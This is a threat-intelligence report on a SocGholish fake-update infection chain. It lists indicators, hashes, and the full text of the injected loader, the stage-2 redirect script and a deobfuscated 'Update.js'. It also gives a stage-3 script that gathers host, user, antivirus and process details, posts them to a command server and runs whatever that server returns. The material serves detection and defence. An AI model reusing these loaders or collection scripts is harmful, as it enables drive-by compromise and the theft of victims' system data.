TLP: AMBER - No Attribution
THREAT IDENTIFICATION: SOCGHOLISH

STAGE 1 INFECTED DOMAIN
iamsacademy.com

STAGE 1 INJECTED URL
https://iamsacademy.com/

STAGE 1 INJECTED JAVASCRIPT
<script async src="https://cdnjscloudnetwork.co/privacy/i18min.js"></script>

INTERMEDIATE STAGE REDIRECT URL
https://cdnjscloudnetwork.co/privacy/i18min.js
(Called from the main page)

REDIRECT SCRIPT
;(function(v,d,r,y,a,b){a=d.createElement(r);b=d.getElementsByTagName(r)[0];a.async=1;a.src=y;b.parentNode.insertBefore(a,b);})(window,document,'script','https://pluralism.themancav.com/lbK9kO6Q3vnxkIeio4aRsueQh7L82d/o+dXbsug=');

STAGE 2 URLS
https://pluralism.themancav.com/lbK9kO6Q3vnxkIeio4aRsueQh7L82d/o+dXbsug=

RETURNED SCRIPT
;(function () {
  var _0x2112cd = window,
    _0x2cb1cd = _0x2112cd.document.cookie
  var _0x3b4a15 = 'adViewEnabled'
  if (_0x2112cd.localStorage[_0x2112cd.location.hostname]) {
    return
  }
  if (_0x2112cd.navigator.webdriver) {
    _0x45ad48(
      'https://pluralism.themancav.com/W1ATsCBycNk/cimCbWQ/kigkdsB5ajHAKTVw2D4zeO8xI0zWKT99xD4iYd8pcj+SPiJh3ylyKYF3cmGSYXJ+yD8yMc0='
    )
    return
  }
  if (
    _0x2112cd.outerHeight - _0x2112cd.innerHeight > 200 ||
    _0x2112cd.outerWidth - _0x2112cd.innerWidth > 330
  ) {
    _0x45ad48(
      'https://pluralism.themancav.com/Ao7/x3msnK5mrMX1NLrT5XH6mrcgtN23cOucr2ftlJho/aChcOGRs2f8jahwrNPlZ/yNqHCsxfUurI3lOKySqWvohaNq6IioIPM='
    )
    return
  }
  if (
    _0x2cb1cd.indexOf('wordpress_logged_in_') !== -1 ||
    _0x2cb1cd.indexOf('wp-settings-') !== -1
  ) {
    return
  }
  if (typeof _0x2112cd[_0x3b4a15] !== 'undefined') {
    return
  }
  _0x2112cd[_0x3b4a15] = true
  _0x2112cd.addEventListener('mousemove', _0x2a49ce, true)
  function _0x2a49ce() {
    _0x2112cd.removeEventListener('mousemove', _0x2a49ce, true)
    _0x45ad48(
      'https://pluralism.themancav.com/2HgFVqNaZj+8Wj9k7kwpdKsMYCb6Qic3thlpL6IdWjCoWil0qlo/dLYJcSSzG3UxvhJxPqpaeA=='
    )
  }
  function _0x45ad48(_0x40147f) {
    var _0x42ca1e = document.createElement('script')
    _0x42ca1e.async = true
    _0x42ca1e.src = _0x40147f
    var _0x1bd434 = document.getElementsByTagName('script')[0]
    _0x1bd434.parentNode.insertBefore(_0x42ca1e, _0x1bd434)
  }
})()

NEXT SCRIPT URL
https://pluralism.themancav.com/2HgFVqNaZj+8Wj9k7kwpdKsMYCb6Qic3thlpL6IdWjCoWil0qlo/dLYJcSSzG3UxvhJxPqpaeA==
(Returns JavaScript pointing to the next URL)

JAVASCRIPT FILE DOWNLOAD URL
https://pluralism.themancav.com/yUqN3bJo7rStaLfv/36h/7o+6K3rcK+xqCTptKct0rugJuj/5Wj///No/rulLuaooyTopbk86r+zJef/tA==

JAVASCRIPT FILE HASH
Update.js
21fb7f87b7cf4b4766986031a3e47b72
SHA1: aa2b8e4cdf0eeaec4dadc0f561d950479417d143
SHA256: eec86d139e5a3deea66e62b9030d2ce672443d76ccd6034acaa890276a5783ee

JAVASCRIPT FILE CONTENTS (DEOBFUSCATED)
if (1) {
function a0_0xea108e(_0x1de46d) {
var _0x1c180f = 'responseText'
return _0x1de46d[_0x1c180f]
}
var a0_0x2974b4 = new this.ActiveXObject('MSXML2.XMLHTTP')
a0_0x2974b4.open(
'POST',
'https://pip.pages.microcloud360.com/editContent',
false
)
a0_0x2974b4.setRequestHeader('Upgrade-Insecure-Requests', '1')
a0_0x2974b4.send('lM6JNuuGGNT4WCi+mY5c4q0tAfuCmGYnUYWrFFG3rg==')
this.eval(a0_0xea108e(a0_0x2974b4))
}

STAGE 3 PROXY FOR SOCGHOLISH C2
https://pip.pages.microcloud360.com/editContent

RETURNED SCRIPT
var sp = ''
var vb = new ActiveXObject('WScript.Shell')
var iv = new ActiveXObject('WScript.Network')
var yw = []
yw.push('b')
yw.push('505')
yw.push(WScript.ScriptFullName)
yw.push(iv.ComputerName)
yw.push(iv.UserName)
yw.push(iv.UserDomain)
yw.push(vb.ExpandEnvironmentStrings('%userdnsdomain%'))
yw.push(wz('CIMV2', 'Win32_ComputerSystem', 'Manufacturer'))
yw.push(wz('CIMV2', 'Win32_ComputerSystem', 'Model'))
yw.push(
  wz('CIMV2', 'Win32_BIOS', 'Version') +
    wz('CIMV2', 'Win32_BIOS', 'SerialNumber')
)
yw.push(wz('SecurityCenter2', 'AntiSpywareProduct', 'displayName'))
yw.push(wz('SecurityCenter2', 'AntiVirusProduct', 'displayName'))
yw.push(wz('CIMV2', 'CIM_NetworkAdapter', 'MACAddress'))
yw.push(wz('CIMV2', 'Win32_Process', 'Name'))
yw.push(wz('CIMV2', 'Win32_OperatingSystem', 'BuildNumber'))
function wz(nl, rj, lo) {
  var my = ''
  try {
    var rx = GetObject('winmgmts:\\\\.\\root\\' + nl)
    var hu = rx.ExecQuery('SELECT * FROM ' + rj, 'WQL')
    var rs = new Enumerator(hu)
    for (; !rs.atEnd(); rs.moveNext()) {
      var zz = rs.item()
      if (zz[lo]) {
        my += zz[lo] + '|'
      }
    }
  } catch (e) {
    my = '-1'
  }
  return my
}
try {
  var ii = ''
  for (var kd = 0; kd < yw.length; kd++) {
    ii += kd + '=' + encodeURIComponent(yw[kd]) + '&'
  }
  var my = ''
  var nf = new ActiveXObject('MSXML2.XMLHTTP')
  nf.open('POST', 'https://pip.pages.microcloud360.com/editContent', false)
  nf.setRequestHeader('Upgrade-Insecure-Requests', '1')
  nf.send(ii)
  my = nf.responseText
  var evString = 'eval'
  this[evString](my)
} catch (e) {}

PAYLOAD DOWNLOAD URL
I did not obtain a payload.

PAYLOAD FILE HASH
I did not obtain a payload.

PAYLOAD C2
I did not obtain a payload.


